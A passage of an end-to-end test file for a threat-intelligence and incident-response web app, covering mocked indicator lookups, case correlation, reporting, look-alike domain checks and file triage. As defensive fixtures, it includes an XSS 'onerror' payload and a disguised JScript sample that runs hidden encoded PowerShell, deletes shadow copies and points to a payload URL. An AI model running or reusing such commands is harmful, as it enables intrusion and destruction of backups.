  expect(await page.evaluate(() => ({ v: ATTACK.v, g: ATTACK.groups.find(g => g.id === 'G9999'), live: !!ATTACK.live }))).toEqual({ v: 'Enterprise 2099-02-02', g: expect.objectContaining({ n: 'Zebra <b>Panda</b>', a: ['ZP-99'], t: ['T1003'] }), live: true });
  expect(await page.evaluate(() => ctiFind('Attacks by ZP-99 group continue').act)).toEqual(['G9999']);
  // the CVE record on demand from the CVE page (CVE.org, with CISA's assessment); hostile text stays text
  await page.evaluate(() => ctiCveDlg('CVE-2024-3400')); await page.click('[data-act=ctiNvdOne]');
  await expect(page.locator('.ti-scores')).toContainText('10.0'); await expect(page.locator('.ti-scores')).toContainText('CRITICAL');
  await expect(page.locator('.ti-ssvc')).toContainText('active');
  expect(await page.evaluate(() => DB.intel.cve['CVE-2024-3400'].refs)).toEqual(['https://www.cve.org/CVERecord?id=CVE-2024-3400']);
  expect(await page.locator('.dlg script').count()).toBe(0);
  // now allow the news relay: the article is stored as plain text with no javascript: link
  await page.evaluate(() => { DB.prefs.liveFeeds = true; }); await page.click('[data-act=dclose] >> nth=0').catch(() => {});
  await page.evaluate(() => refreshFeeds()); await expect.poll(() => page.evaluate(() => intelBusy)).toBe(false);
  const f = await page.evaluate(() => DB.feed.find(x => /exploitation by ZP-99 group/.test(x.title)));
  expect(f.title).not.toMatch(/<img/); expect(f.body).not.toMatch(/<script|alert/); expect(f.link).toBe('');
  expect(await page.evaluate(id => ctiX(DB.feed.find(x => x.id === id)).act.length, f.id)).toBe(1);
  noErrors(errors);
});

test('investigate (services faked): live lookups are weighed into a verdict with reasons, a case is checked and correlated, keys stay out of backups, watch notices changes', async ({ page }) => {
  test.setTimeout(90000);
  const errors = await open(page, '#/feeds'); const hits = [];
  const cors = { 'access-control-allow-origin': '*', 'content-type': 'application/json' }, J = (r, o) => r.fulfill({ headers: cors, body: JSON.stringify(o) });
  const day = new Date(Date.now() - 3 * 864e5).toISOString(); let ports = [22, 443, 50050];
  await page.route(/^https:\/\/(?!r\.workers\.dev)[^/]+\//, r => { hits.push('other:' + new URL(r.request().url()).host); r.abort(); });
  await page.route('https://internetdb.shodan.io/**', r => { hits.push('idb'); J(r, { ip: '45.77.10.20', ports, hostnames: [], tags: ['c2'], vulns: ['CVE-2023-48795'], cpes: ['cpe:/a:openbsd:openssh:8.2'] }); });
  await page.route('https://dns.google/**', r => { const u = new URL(r.request().url()), n = u.searchParams.get('name'), t = u.searchParams.get('type'); hits.push('dns');
    J(r, { Status: 0, Answer: t === 'A' ? [{ name: n, type: 1, TTL: 60, data: '45.77.10.20' }] : t === 'NS' ? [{ name: n, type: 2, TTL: 60, data: 'ns1.badns.top.' }] : [] }); });
  await page.route('https://rdap.org/**', r => { hits.push('rdap'); /\/ip\//.test(r.request().url()) ? J(r, { name: 'VULTR', country: 'US', startAddress: '45.77.0.0', endAddress: '45.77.255.255', cidr0_cidrs: [{ v4prefix: '45.77.0.0', length: 16 }] })
    : J(r, { ldhName: 'x', events: [{ eventAction: 'registration', eventDate: day }], entities: [{ roles: ['registrar'], vcardArray: ['vcard', [['fn', {}, 'text', 'NameSilo, LLC']]] }], nameservers: [{ ldhName: 'NS1.BADNS.TOP' }], status: ['client transfer prohibited'] }); });
  await page.route('https://ipinfo.io/**', r => { hits.push('ipinfo'); J(r, { ip: '45.77.10.20', org: 'AS20473 The Constant Company, LLC', country: 'US', city: 'Piscataway' }); });
  await page.route('https://otx.alienvault.com/**', r => { hits.push('otx'); J(r, { pulse_info: { count: 1, pulses: [{ name: '<img src=x onerror="window.__pwned=1">Cobalt Strike servers', modified: new Date().toISOString(), malware_families: [{ display_name: 'Cobalt Strike' }], adversary: '', attack_ids: [{ id: 'T1071' }] }] }, validation: [] }); });
  await page.route('https://r.workers.dev/**', r => { const u = new URL(r.request().url()); hits.push('relay' + u.pathname); J(r, { data: { attributes: { last_analysis_stats: { malicious: 12, suspicious: 1, harmless: 50, undetected: 10 }, reputation: -30 } } }); });
  // nothing is on yet: investigating asks no one
  await page.click('[data-act=itab][data-v=look]');
  await page.fill('#lkQ', 'hxxp://45[.]77[.]10[.]20'); await page.press('#lkQ', 'Enter');
  await expect(page.locator('.lk-head')).toContainText('45.77.10.20'); expect(hits).toEqual([]);
  // turn on the free sources; the relay ones stay unavailable without a relay
  await page.click('.lk-q ~ .ti-relay [data-act=lkFreeOn]'); await page.evaluate(() => { const S = lkSettings(); delete S.on.ht; delete S.on.cs; });
  await page.click('[data-act=lookAgain]');
  await expect.poll(() => page.evaluate(() => LKV.pending.size), { timeout: 20000 }).toBe(0);
  expect(hits).toContain('idb'); expect(hits).toContain('otx'); expect(hits.some(h => /^relay/.test(h))).toBe(false);
  const V = await page.evaluate(() => lkVerdict('ipv4', '45.77.10.20', LKV.res));
  expect(V.band).toBe('malicious'); expect(V.reasons[0].why).toMatch(/Shodan tags it c2|OTX/); expect(V.attrs.asn).toBe('AS20473');
  await expect(page.locator('.lk-why')).toContainText('Shodan tags it c2');
  expect(await page.evaluate(() => ({ p: window.__pwned, img: document.querySelectorAll('.lk img, .lk [onerror]').length }))).toEqual({ p: undefined, img: 0 });
  await page.click('[data-act=lookVerdict]'); expect(await page.evaluate(() => DB.verdicts['ipv4:45.77.10.20'])).toBe('malicious');
  // answers are kept: asking again without "Check again" calls no one
  const n0 = hits.length; await page.evaluate(() => lookGo('ipv4', '45.77.10.20')); await page.waitForTimeout(300); expect(hits.slice(n0)).toEqual([]);
  // a relay: VirusTotal is reached through it with the token, never directly
  await page.evaluate(() => { const S = lkSettings(); S.relay = { url: 'https://r.workers.dev', token: 'TOK' }; S.on.vt = true; S.keys.shodan = 'SECRET-KEY'; });
  await page.evaluate(() => lookGo('domain', 'paypa1-secure.com', true)); await expect.poll(() => page.evaluate(() => LKV.pending.size), { timeout: 20000 }).toBe(0);
  expect(hits).toContain('relay/vt/api/v3/domains/paypa1-secure.com');
  expect(await page.evaluate(() => lkVerdict('domain', 'paypa1-secure.com', LKV.res).reasons.map(e => e.why).join('|'))).toMatch(/12\/73 VirusTotal engines.*|Registered 3 days ago/);
  // keys and the relay token never go into a backup
  const bk = await page.evaluate(() => JSON.stringify(backupObject ? Object.assign({}, DB, { intel: Object.assign({}, DB.intel, { look: { on: DB.intel.look.on, keys: {}, relay: { url: DB.intel.look.relay.url, token: '' } } }) }) : ''));
  const real = await page.evaluate(async () => JSON.stringify(await backupObject()));
  expect(real).not.toContain('SECRET-KEY'); expect(real).not.toContain('TOK"'); expect(bk).toBeTruthy();
  // a whole case: the two look-alike domains share an address, name servers and registration day → one group, linked on the graph
  await page.evaluate(() => { const c = { id: uid('c'), name: 'Phish', code: 'PH-1', status: 'active', owner: 'You', created: Date.now(), updated: Date.now(), scope: '', color: CASE_COLORS[0], icon: 'briefcase' }; DB.cases.push(c); DB.active = c.id; DB.records.push({ id: uid('r'), caseId: DB.active, type: 'evidence', title: 'phish', body: 'paypa1-secure.com paypa1-verify.com 45.77.10.20', tsRaw: '', tsZone: 'explicit', ts: Date.now(), source: 't', host: '', tags: [], ents: E.extract('paypa1-secure.com paypa1-verify.com 45.77.10.20'), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); mutate('t'); });
  await page.click('[data-act=lookCase]');
  await expect.poll(() => page.evaluate(() => !!(LKV.bulk && LKV.bulk.fin)), { timeout: 45000 }).toBe(true);
  const C = await page.evaluate(() => LKV.bulk.corr.clusters);
  expect(C.length).toBe(1); expect(C[0]).toEqual(expect.arrayContaining(['domain:paypa1-secure.com', 'domain:paypa1-verify.com']));
  await expect(page.locator('.lk-cl')).toContainText(/same IP address|same name servers/);
  const l0 = await page.evaluate(() => DB.links.length); await page.click('[data-act=lookLink]');
  expect(await page.evaluate(() => DB.links.length)).toBeGreaterThan(l0);
  // the watch monitor: a new open port is noticed
  await page.evaluate(async () => { toggleWatch('ipv4:45.77.10.20'); await watchCheck(['ipv4:45.77.10.20'], { quiet: true }); });
  ports = [22, 443, 50050, 3389];
  await page.evaluate(async () => { await watchCheck(['ipv4:45.77.10.20'], { quiet: true }); });
  expect(await page.evaluate(() => DB.watch['ipv4:45.77.10.20'].alerts[0].d.map(d => d.t).join('|'))).toContain('New port: 3389');
  await page.goto(page.url().replace(/#.*/, '#/watch')); await expect(page.locator('.wl-ch')).toContainText('3389');
  noErrors(errors.filter(e => !/Failed to load resource/.test(e)));          // the services this test refuses on purpose
});

test('threat intel "For you": stories touching your cases, watchlist and stack come first with reasons, and triage teaches the order', async ({ page }) => {
  const errors = await open(page, '#/feeds');
  const r = await page.evaluate(() => {
    const now = Date.now(), mk = (title, ago, extra = {}) => ({ id: uid('f'), title, body: title, source: 'Test', cat: 'general', ts: now - ago * 36e5, link: '', live: true, ...extra });
    DB.feed = [mk('Quarterly gardening trends report', 1), mk('Gardening tools roundup', 2), mk('Gardening season opens', 3), mk('Ransomware gang hits hospital', 30), mk('Ransomware group leaks data', 31), mk('Ransomware actors use new loader', 40), mk('Infrastructure at 198.51.100.77 used by attackers', 50)];
    DB.watch = { 'ipv4:198.51.100.77': { at: now - 864e5 * 10 } };
    DB.feed.slice(0, 2).forEach(f => f.st = 'dismissed'); DB.feed[3].st = 'relevant'; DB.feed[4].st = 'relevant'; mutate('t');
    UI.itri = 'all'; UI.isort = 'you'; const S = ctiFeedList();
    return { first: S[0].lead.title, why: S[0].rk.why, order: S.map(s => s.lead.title), learned: ctiModel().wt.get('ransomware') > 0 && ctiModel().wt.get('gardening') < 0 };
  });
  expect(r.first).toMatch(/198\.51\.100\.77/); expect(r.why.join(' ')).toMatch(/watched indicator/);
  expect(r.learned).toBe(true);
  expect(r.order.indexOf('Ransomware actors use new loader')).toBeLessThan(r.order.indexOf('Gardening season opens'));        // learned from triage, despite being older
  await page.evaluate(() => renderMain()); await expect(page.locator('.ti-why').first()).toContainText('watched');
  noErrors(errors);
});

test('case copilot: next steps, gaps and the story come from the case; actions work; auto-check runs only when the case asks', async ({ page }) => {
  const errors = await open(page, '#/home');
  const h = await page.evaluate(() => caseHash(DB.active, 'overview')); await page.goto(page.url().replace(/#.*/, h));
  const cp = page.locator('.cp'); await expect(cp).toBeVisible();
  await expect(cp).toContainText('Phishing email triage'); await expect(cp.locator('.cp-story')).toContainText('judged malicious');
  await expect(cp.locator('.cp-story')).toContainText('WS-FIN-07');
  // story never contains markup from evidence
  expect(await page.evaluate(() => /<(?!\/?(b|span)\b)/.test(copilot().story.join('')))).toBe(false);
  // watch the malicious indicators
  await page.click('.cp [data-act=cpAll]'); await page.click('.cp [data-act=cpWatch]');
  expect(await page.evaluate(() => Object.keys(DB.watch).length)).toBeGreaterThanOrEqual(6);
  await expect(cp).not.toContainText('Watch 6 malicious');
  // save the story as a note
  const n0 = await page.evaluate(() => DB.notes.length); await page.click('.cp [data-act=cpNote]');
  expect(await page.evaluate(() => DB.notes[0].text)).toMatch(/^# Story so far/);
  expect(await page.evaluate(() => DB.notes.length)).toBe(n0 + 1);
  // auto-check is unavailable until sources are on; then it looks up only new public indicators of that case
  await expect(cp.locator('[data-act=cpAuto]')).toBeDisabled();
  const hits = []; await page.route(/^https:\/\/(?!internetdb)[^/]+\//, r => r.abort());
  await page.route('https://internetdb.shodan.io/**', r => { hits.push(r.request().url()); r.fulfill({ headers: { 'access-control-allow-origin': '*', 'content-type': 'application/json' }, body: JSON.stringify({ ip: '45.77.10.20', ports: [50050], hostnames: [], tags: ['c2'], vulns: [], cpes: [] }) }); });
  await page.evaluate(() => { lkSettings().on = { idb: true }; mutate('t'); renderMain(); });
  await page.check('.cp [data-act=cpAuto]');
  await page.evaluate(() => { DB.records.push({ id: uid('r'), caseId: DB.active, type: 'evidence', title: 'fw', body: 'deny 45.77.10.20', tsRaw: '', tsZone: 'explicit', ts: Date.now(), source: 't', host: 'FW-EDGE', tags: [], ents: E.extract('deny 45.77.10.20'), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); mutate('added'); });
  await expect.poll(() => hits.length, { timeout: 10000 }).toBe(1);
  expect(hits[0]).toContain('45.77.10.20');
  await expect.poll(() => page.evaluate(() => (DB.intel.lookHist || []).some(x => x.v === '45.77.10.20'))).toBe(true);
  // another case without auto-check: its new indicators are not looked up
  await page.evaluate(() => { const o = DB.cases.find(c => c.id !== DB.active); DB.records.push({ id: uid('r'), caseId: o.id, type: 'evidence', title: 'x', body: '45.77.99.99', tsRaw: '', tsZone: 'explicit', ts: Date.now(), source: 't', host: '', tags: [], ents: E.extract('45.77.99.99'), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); mutate('x'); });
  await page.waitForTimeout(2500); expect(hits.length).toBe(1);
  noErrors(errors.filter(e => !/Failed to load resource/.test(e)));
});

test('graph intelligence: risk spreads from malicious along links with reasons, benign stops it; key nodes; hidden links from saved lookups; expand online with undo', async ({ page }) => {
  const errors = await open(page, '#/home');
  const r = await page.evaluate(() => { const R = gRisk(), by = n => { const e = DB.entries.find(x => x.caseId === DB.active && primary(x) === n); return e && R.get(e.id); };
    const lnk = by('Invoice_4471.pdf.lnk'), person = by('Jordan Okafor'); return { lnk: lnk && Math.round(lnk.r * 100), why: lnk && riskWhy(lnk), person: person && Math.round(person.r * 100) }; });
  expect(r.lnk).toBe(60); expect(r.why).toMatch(/linked to http:\/\/update-lamp\.test/); expect(r.person).toBeLessThan(20);           // people take less risk than infrastructure
  expect(await page.evaluate(() => { const lnk = DB.entries.find(x => x.caseId === DB.active && primary(x) === 'Invoice_4471.pdf.lnk'); lnk.fields.verdict = 'benign'; setEntryVerdict(lnk, 'benign'); mutate('b');
    const p = DB.entries.find(x => x.caseId === DB.active && primary(x) === 'Jordan Okafor'); const x = gRisk().get(p.id); return x ? x.r : 0; })).toBeLessThan(0.05);
  // insights panel
  await page.evaluate(() => { UI.graph.panel = 'ins'; }); await page.goto(page.url().replace(/#.*/, await page.evaluate(() => caseHash(DB.active, 'graph'))));
  await expect(page.locator('.gpanel')).toContainText('At risk'); await expect(page.locator('.gpanel')).toContainText('Key nodes');
  await page.check('[data-act=gRiskOn]'); expect(await page.evaluate(() => cy.nodes('.rk1, .rk2, .rk3').length)).toBeGreaterThan(0);
  // hidden links: two domains whose saved lookups share a certificate become a suggestion (no network)
  const s = await page.evaluate(async () => { await lkLoad(); const mk = (v) => { const e = { id: uid('v'), caseId: DB.active, type: 'domain', fields: { domain: v }, priority: 'medium', starred: false, tags: [], notes: '', src: '', created: Date.now(), pos: null }; DB.entries.push(e); return e; };
    const a = mk('alpha-pay.top'), b = mk('beta-pay.top'); const res = { ok: true, at: Date.now(), sig: [], facts: [], attrs: { certs: ['ab'.repeat(32)], ns: ['ns1.evilns.top'] }, related: [] };
    LK.cache.set('vt|domain:alpha-pay.top', res); LK.cache.set('vt|domain:beta-pay.top', res); mutate('t');
    const S = suggestLinks(DB.active).find(x => [x.a.id, x.b.id].sort().join() === [a.id, b.id].sort().join()); return S && { label: S.label, why: S.why.join() }; });
  expect(s).toEqual({ label: 'shares infrastructure with', why: expect.stringMatching(/same TLS certificate/) });
  // expand online: DNS answers become linked entries; undo removes them
  await page.route(/^https:\/\/(?!dns\.google)[^/]+\//, r => r.abort());
  await page.route('https://dns.google/**', r => { const t = new URL(r.request().url()).searchParams.get('type'); r.fulfill({ headers: { 'access-control-allow-origin': '*', 'content-type': 'application/json' }, body: JSON.stringify({ Status: 0, Answer: t === 'A' ? [{ type: 1, data: '45.77.10.20' }] : t === 'NS' ? [{ type: 2, data: 'ns1.evilns.top.' }] : [] }) }); });
  const e0 = await page.evaluate(() => DB.entries.length);
  await page.evaluate(async () => { lkSettings().on = { dns: true }; await expandOnline(DB.entries.find(x => primary(x) === 'alpha-pay.top').id); });
  const got = await page.evaluate(() => { const ip = DB.entries.find(x => primary(x) === '45.77.10.20'); return ip && DB.links.filter(l => l.b === ip.id).map(l => l.label); });
  expect(got).toEqual(['resolves to']); expect(await page.evaluate(() => DB.entries.length)).toBe(e0 + 1);
  await page.click('#toast button, .toast button'); expect(await page.evaluate(() => DB.entries.length)).toBe(e0);
  noErrors(errors.filter(e => !/Failed to load resource/.test(e)));
});

test('smart search: plain questions become filters shown as chips, run over every case; ordinary search still works', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => Object.fromEntries(['malicious IPs', 'malicious domains in TN-2026-014', 'what talks to 203.0.113.47', 'IPs seen in september 2026 on DC01', 'unchecked hashes', 'lamp loader'].map(q => { const N = nlqParse(q); return [q, N ? { c: N.chips.map(x => x.t), v: nlqRun(N).map(x => x.v) } : null]; })));
  expect(R['malicious IPs']).toEqual({ c: ['malicious', 'IP addresses'], v: ['203.0.113.47'] });
  expect(R['malicious domains in TN-2026-014'].v.sort()).toEqual(['lantern-invoice.example', 'update-lamp.test']);
  expect(R['what talks to 203.0.113.47'].v).toContain('203.0.113.47:4444'); expect(R['what talks to 203.0.113.47'].v).not.toContain('203.0.113.47');
  expect(R['IPs seen in september 2026 on DC01']).toEqual({ c: ['IP addresses', 'seen september 2026', 'on DC01'], v: ['10.20.4.17'] });
  expect(R['unchecked hashes'].v.length).toBe(2); expect(R['lamp loader']).toBeNull();
  // time words
  expect(await page.evaluate(() => { const t = nlqTime('last 3 days', 1e12); return [t[1] - t[0], t[2]]; })).toEqual([3 * 864e5, 'last 3 days']);
  // the search box
  await page.keyboard.press('Control+k'); await page.fill('#srQ', 'malicious domains in TN-2026-014');
  await expect(page.locator('.sr-nl')).toContainText('in TN-2026-014'); await expect(page.locator('.sr-nl')).toContainText('2 matches');
  await page.keyboard.press('Enter'); await expect(page).toHaveURL(/#\/entities/);
  await page.keyboard.press('Control+k'); await page.fill('#srQ', 'lamp loader'); await expect(page.locator('.sr-nl')).toHaveCount(0); await expect(page.locator('#srList')).toContainText('Lamp loader');
  noErrors(errors);
});

test('report writer: bottom line, attack path, recommendations and confidence are drafted from the case; editable; Word export', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { DB.prefs.repT = 'full'; }); await page.goto(page.url().replace(/#.*/, await page.evaluate(() => caseHash(DB.active, 'report'))));
  const doc = page.locator('article.doc');
  await expect(doc.locator('.rw-bl')).toContainText('A phishing intrusion affected WS-FIN-07 and DC01');
  await expect(doc).toContainText('Attack path'); await expect(doc).toContainText('Initial Access');
  await expect(doc.locator('.rw-rec').first()).toContainText('Isolate and image WS-FIN-07 and DC01');
  await expect(doc).toContainText('Confidence and limitations');
  // drop a recommendation, then bring it back
  const n = await doc.locator('.rw-rec').count(); await doc.locator('.rw-rec [data-act=repRecOff]').first().click();
  await expect(doc.locator('.rw-rec')).toHaveCount(n - 1); await page.click('[data-act=repRecAll]'); await expect(doc.locator('.rw-rec')).toHaveCount(n);
  // rewrite the bottom line; it shows in Markdown; reset returns to the draft
  await page.click('[data-act=repEdit]'); await page.fill('#repBLt', 'Contained intrusion <b>by</b> a commodity loader.'); await page.click('#dlg button[type=submit]');
  await expect(doc.locator('.rw-bl')).toContainText('Contained intrusion <b>by</b>'); await expect(doc.locator('.rw-bl b')).toHaveCount(0);
  expect(await page.evaluate(() => reportMd())).toContain('**Bottom line (moderate confidence).** Contained intrusion');
  await page.click('[data-act=repEdit]'); await page.click('[data-act=repBLReset]'); await expect(doc.locator('.rw-bl')).toContainText('A phishing intrusion');
  // redaction reaches the drafted text
  await page.check('[data-act=repRedact]'); await expect(doc.locator('.rw-bl')).not.toContainText('billing@lantern-invoice.example');
  // Word
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=exportDocx]')]);
  expect(dl.suggestedFilename()).toMatch(/report\.docx$/);
  const buf = require('fs').readFileSync(await dl.path()); expect(buf.slice(0, 2).toString()).toBe('PK');
  noErrors(errors);
});

test('OSINT: look-alike domains are generated and checked through DNS only when allowed; identity pivots; next steps in the inspector', async ({ page }) => {
  const errors = await open(page, '#/lab');
  const g = await page.evaluate(() => { const L = twGen('paypal.com'); return { n: L.length, has: ['paypa1.com', 'paypal.net', 'paypal-login.com', 'paypla.com', 'xn--pypal-4ve.com'].map(d => L.some(x => x.d === d)), kinds: [...new Set(L.map(x => x.kind))].length }; });
  expect(g.n).toBeGreaterThan(200); expect(g.has).toEqual([true, true, true, true, true]); expect(g.kinds).toBeGreaterThan(10);
  const hits = []; await page.route(/^https:\/\/(?!dns\.google)[^/]+\//, r => r.abort());
  await page.route('https://dns.google/**', r => { const u = new URL(r.request().url()), n = u.searchParams.get('name'), t = u.searchParams.get('type'); hits.push(n);
    const reg = { 'paypa1.com': { A: '45.77.10.20', MX: '10 mx.paypa1.com.' }, 'paypal.com': { A: '64.4.250.36' }, 'paypal.net': { A: '64.4.250.36' } }[n];
    r.fulfill({ headers: { 'access-control-allow-origin': '*', 'content-type': 'application/json' }, body: JSON.stringify(reg ? { Status: 0, Answer: reg[t] ? [{ type: t === 'A' ? 1 : t === 'MX' ? 15 : 2, data: reg[t] }] : [] } : { Status: 3 }) }); });
  await page.click('[data-act=labTab][data-v=twist]'); await page.fill('#twD', 'https://www.paypal.com/signin'); await page.press('#twD', 'Enter');
  await expect(page.locator('[data-act=twCheck]')).toBeDisabled(); expect(hits).toEqual([]);                 // nothing is sent until DNS lookups are allowed
  await page.click('[data-act=twDnsOn]'); await page.click('[data-act=twCheck]');
  await expect(page.locator('.tw-tbl')).toContainText('paypa1.com', { timeout: 30000 });
  await expect.poll(() => page.evaluate(() => !UI.tw.running), { timeout: 60000 }).toBe(true);
  const rows = await page.evaluate(() => UI.tw.list.filter(x => x.exists).map(x => [x.d, twRisk(x, UI.tw.orig).s]));
  expect(rows.find(r => r[0] === 'paypa1.com')[1]).toBeGreaterThan(rows.find(r => r[0] === 'paypal.net')[1]);                 // mail-capable look-alike outranks one on the original's servers
  // identity
  await page.click('[data-act=labTab][data-v=ident]'); await page.fill('#idQ', 'Jordan.Okafor1992+shop@GoogleMail.com'); await page.press('#idQ', 'Enter');
  await expect(page.locator('.id-dl')).toContainText('Jordan Okafor'); await expect(page.locator('.labgrid')).toContainText('Delivers to jordanokafor1992@gmail.com');
  await expect(page.locator('.labgrid')).toContainText('1992');
  await page.fill('#idQ', '+44 20 7946 0000'); await page.press('#idQ', 'Enter'); await expect(page.locator('.id-dl')).toContainText('United Kingdom');
  await page.fill('#idQ', '@n1ghtlamp'); await page.press('#idQ', 'Enter'); await expect(page.locator('.id-grid a[href="https://github.com/n1ghtlamp"]')).toHaveCount(1);
  expect(await page.evaluate(() => [idEmail('ops@mailinator.com').disposable, idEmail('admin@corp.example').role])).toEqual([true, true]);
  // the inspector suggests next steps for a domain
  expect(await page.evaluate(() => pivotPlan('domain', 'lantern-invoice.example').map(p => p.act))).toContain('osTwist');
  noErrors(errors.filter(e => !/Failed to load resource/.test(e)));
});

test('detections intelligence: coverage against what cases show, gaps become draft rules, health lint and run across all evidence, tuning', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.click('[data-act=dview][data-v=coverage]');
  await expect(page.locator('.cv-sum')).toContainText('techniques covered'); expect(await page.locator('.cv-t').count()).toBeGreaterThan(10);
  // a technique the evidence shows with no rule is a gap, and can be drafted
  const id = await page.evaluate(() => { const C = coverage(), have = new Set(C.all.filter(x => x.rules.length).map(x => x.id)); const t = ATTACK.tech.find(x => !x[0].includes('.') && !have.has(x[0]) && !DB.rules.some(r => ruleTechs(r).some(y => y.startsWith(x[0])))); const r = DB.records.find(x => x.type !== 'lead'); r.ents = (r.ents || []).concat([{ k: 'ttp', v: t[0] }]); mutate('t'); return t[0]; });
  await page.evaluate(() => renderMain()); await expect(page.locator('.cv-gaps')).toContainText(id);
  const n0 = await page.evaluate(() => DB.rules.length); await page.click(`.cv-gaps [data-act=cvGap][data-v=${id}]`);
  expect(await page.evaluate(() => DB.rules.length)).toBe(n0 + 1); expect(await page.evaluate(() => DB.rules[0].code)).toContain('attack.' + id.toLowerCase());
  // lint
  const L = await page.evaluate(() => ruleLint({ type: 'sigma', title: 'x', code: 'title: x\nlogsource:\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: \'ab\'\n    unused:\n        Image: \'a.exe\'\n    condition: selection or missing\n', tags: [], technique: '' }).map(l => l.sev + ':' + l.t));
  expect(L.join('|')).toMatch(/err:Condition names “missing”/); expect(L.join('|')).toMatch(/warn:Selection “unused” is never used/); expect(L.join('|')).toMatch(/warn:CommandLine\|contains contains “ab” — too short/);
  expect(await page.evaluate(() => ruleLint(DB.rules.find(r => /Password Spray From Single Source/.test(r.title))).filter(l => l.sev === 'err').length)).toBe(0);     // aggregations are not selections
  // health: a deliberately noisy rule is flagged and gets a tuning suggestion; two identical rules are duplicates
  await page.evaluate(() => { const mk = t => ({ id: uid('r'), type: 'sigma', title: t, desc: '', code: 'title: ' + t + '\nlogsource:\n    product: any\ndetection:\n    selection:\n        - \'beacon\'\n    condition: selection\nlevel: low', severity: 'low', category: 'other', technique: 'T1071', author: 'You', platform: 'Any', tags: [], refs: [], created: Date.now(), modified: Date.now(), starred: false });
    DB.rules.push(mk('Noisy beacon word'), mk('Noisy beacon word copy')); for (let i = 0; i < 12; i++) DB.records.push({ id: uid('r'), caseId: DB.active, type: 'evidence', title: 'beacon heartbeat ' + i, body: 'host=WS-99 msg=beacon ok', tsRaw: '', tsZone: 'explicit', ts: Date.now(), source: 'proxy', host: 'WS-99', tags: [], ents: [], answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); mutate('t'); });
  await page.evaluate(() => { UI.ropen = false; renderMain(); }); await page.click('[data-act=dview][data-v=health]');
  await expect(page.locator('.dq-list')).toContainText('Noisy beacon word', { timeout: 30000 });
  const H = await page.evaluate(() => { const r = DQ.health.rows.find(x => x.r.title === 'Noisy beacon word'); return { noisy: r.noisy, dups: (r.dups || []).map(d => d.title), tune: tuneSuggest(r) && tuneSuggest(r).yaml }; });
  expect(H.noisy).toBe(true); expect(H.dups).toContain('Noisy beacon word copy'); expect(H.tune).toMatch(/filter_common:[\s\S]*: 'ws-99'[\s\S]*and not filter_common/);
  await page.click('.dq-r [data-act=dqOpen] >> nth=0'); await expect(page.locator('.drw, .ide-ed, .fp-card').first()).toBeVisible();
  noErrors(errors);
});

test('file triage: a disguised script that deletes backups scores malicious with reasons and an entropy map; a plain text file is clean; marking feeds the case', async ({ page }) => {
  const errors = await open(page, '#/lab');
  const bad = 'var s=new ActiveXObject("WScript.Shell");s.Run("powershell -w hidden -enc ' + 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA' + '");s.Run("vssadmin delete shadows /all /quiet");// http://45.77.10.20/payload.bin\n';
  await page.setInputFiles('#labIn', { name: 'Invoice_2026.pdf.js', mimeType: 'application/javascript', buffer: Buffer.from(bad) });
  await expect(page.locator('.tri')).toBeVisible({ timeout: 15000 });
  const T = await page.evaluate(() => { const t = fileTriage(UI.labFile); return { s: t.score, b: t.band, r: t.reasons.map(x => x.t).join('|'), map: t.map.length }; });
  expect(T.b).toBe('malicious'); expect(T.r).toMatch(/Double extension/); expect(T.r).toMatch(/Deletes backups/); expect(T.r).toMatch(/Encoded PowerShell/); expect(T.r).toMatch(/45\.77\.10\.20/); expect(T.map).toBeGreaterThan(0);
  await expect(page.locator('.tri')).toContainText('Likely malicious'); await expect(page.locator('.tri-ent')).toBeVisible();
  await page.click('[data-act=triMark]'); expect(await page.evaluate(() => verdictOf('sha256:' + UI.labFile.sha256))).toBe('malicious');
  await expect(page.locator('.tri')).toContainText('You marked this file malicious before');
  expect(await page.evaluate(() => labSummary(UI.labFile))).toMatch(/Triage: Likely malicious — \d+\/100/);
  await page.click('[data-act=labClear]');
  await page.setInputFiles('#labIn', { name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('Meeting notes. Buy milk. Call Sam on Tuesday about the budget.\n') });
  await expect(page.locator('.tri')).toContainText('Nothing alarming', { timeout: 15000 });
  noErrors(errors);
});

test('speed: a 10,000-record case stays responsive (copilot, smart search, risk, overview edits, graph)', async ({ page }) => {
  test.setTimeout(120000);
  const errors = await open(page, '#/home');
  await page.evaluate(() => (() => { const N = 10000;
    const c = { id: 'c-big', name: 'Big case — load test', code: 'BIG-1', status: 'active', owner: 'You', created: Date.now(), updated: Date.now(), scope: 'Load', color: CASE_COLORS[1], icon: 'briefcase' }; DB.cases.push(c);
    const hosts = Array.from({ length: 60 }, (_, i) => 'WS-' + i), t0 = Date.parse('2026-09-01T00:00:00Z');
    for (let i = 0; i < N; i++) { const ip = '45.' + (i % 200) + '.' + ((i * 7) % 250) + '.' + ((i * 13) % 250), dom = 'host' + (i % 900) + '.evil' + (i % 37) + '.top';
      const body = `EventID=${[4624, 4625, 1, 3, 11, 7045][i % 6]} Image=C:\\Windows\\System32\\cmd.exe CommandLine="cmd /c ping ${dom}" DestinationIp=${ip} DestinationPort=${[443, 80, 4444, 8080][i % 4]} User=CORP\\u${i % 300}`;
      DB.records.push({ id: 'rb' + i, caseId: c.id, type: 'evidence', title: 'Event ' + i + ' on ' + hosts[i % 60], body, tsRaw: '', tsZone: 'explicit', ts: t0 + i * 61000, source: ['sysmon', 'security', 'proxy'][i % 3], host: hosts[i % 60], tags: [], ents: E.extract(body), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' }); }
    for (let i = 0; i < 300; i++) { const e = { id: 'vb' + i, caseId: c.id, type: 'domain', fields: { domain: 'host' + i + '.evil' + (i % 37) + '.top' }, priority: 'medium', starred: false, tags: [], notes: '', src: '', created: Date.now(), pos: { x: (i % 20) * 80, y: Math.floor(i / 20) * 80 } }; DB.entries.push(e); if (i % 5 === 0) DB.verdicts['domain:' + e.fields.domain] = 'malicious'; }
